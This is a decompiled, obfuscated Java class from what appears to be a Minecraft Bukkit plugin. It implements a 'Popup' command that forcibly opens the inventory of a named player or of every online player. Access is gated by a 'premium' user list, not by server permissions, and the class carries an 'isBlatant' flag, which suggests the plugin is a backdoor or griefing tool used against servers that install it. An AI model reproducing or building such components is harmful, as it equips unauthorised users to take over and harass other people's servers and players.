/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.inventory.Inventory
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import java.util.concurrent.ExecutionException;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.plugin.Plugin;

public class PopupCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllllIlIllIIlIIIIllIlI, String lllllllllllllllIlIllIIlIIIIlllIl, String[] lllllllllllllllIlIllIIlIIIIlllII, Player lllllllllllllllIlIllIIlIIIIllIII) {
        if (lllllllllllllllIlIllIIlIIIIllIlI.premium.contains(lllllllllllllllIlIllIIlIIIIllIII.getName())) {
            if (lllllllllllllllIlIllIIlIIIIlllII.length <= 1) {
                lllllllllllllllIlIllIIlIIIIllIII.sendMessage(Settings.USAGE("Popup <player | *>"));
            } else if (lllllllllllllllIlIllIIlIIIIlllII[1].equals("*")) {
                for (Player lllllllllllllllIlIllIIlIIIlIIIIl : Bukkit.getOnlinePlayers()) {
                    lllllllllllllllIlIllIIlIIIIllIlI.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllllIlIllIIlIIIIllIlI, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod((Plugin)lllllllllllllllIlIllIIlIIIIllIlI, () -> lllllllllllllllIlIllIIlIIIlIIIIl.openInventory((Inventory)lllllllllllllllIlIllIIlIIIlIIIIl.getInventory())).get();
                        }
                        catch (InterruptedException | ExecutionException lllllllllllllllIlIllIIlIIIIIIIlI) {
                            // empty catch block
                        }
                    });
                }
                lllllllllllllllIlIllIIlIIIIllIII.sendMessage(Settings.PREFIX("Everyones inventory was opened!"));
            } else {
                Player lllllllllllllllIlIllIIlIIIlIIIII = Bukkit.getServer().getPlayer(lllllllllllllllIlIllIIlIIIIlllII[1]);
                if (lllllllllllllllIlIllIIlIIIlIIIII == null) {
                    lllllllllllllllIlIllIIlIIIIllIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllIlIllIIlIIIIlllII[1]).append(Settings.WHITE).append(" is not online."))));
                } else {
                    lllllllllllllllIlIllIIlIIIIllIlI.getServer().getScheduler().runTaskAsynchronously((Plugin)lllllllllllllllIlIllIIlIIIIllIlI, () -> {
                        try {
                            Bukkit.getScheduler().callSyncMethod((Plugin)lllllllllllllllIlIllIIlIIIIllIlI, () -> lllllllllllllllIlIllIIlIIIlIIIII.openInventory((Inventory)lllllllllllllllIlIllIIlIIIlIIIII.getInventory())).get();
                        }
                        catch (InterruptedException | ExecutionException lllllllllllllllIlIllIIlIIIIIllIl) {
                            // empty catch block
                        }
                    });
                    lllllllllllllllIlIllIIlIIIIllIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(Settings.RED).append(lllllllllllllllIlIllIIlIIIlIIIII.getName()).append("'s").append(Settings.WHITE).append(" inventory was opened!"))));
                }
            }
        } else {
            lllllllllllllllIlIllIIlIIIIllIII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("premium ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    public PopupCommand() {
        PopupCommand lllllllllllllllIlIllIIlIIIlIIlll;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

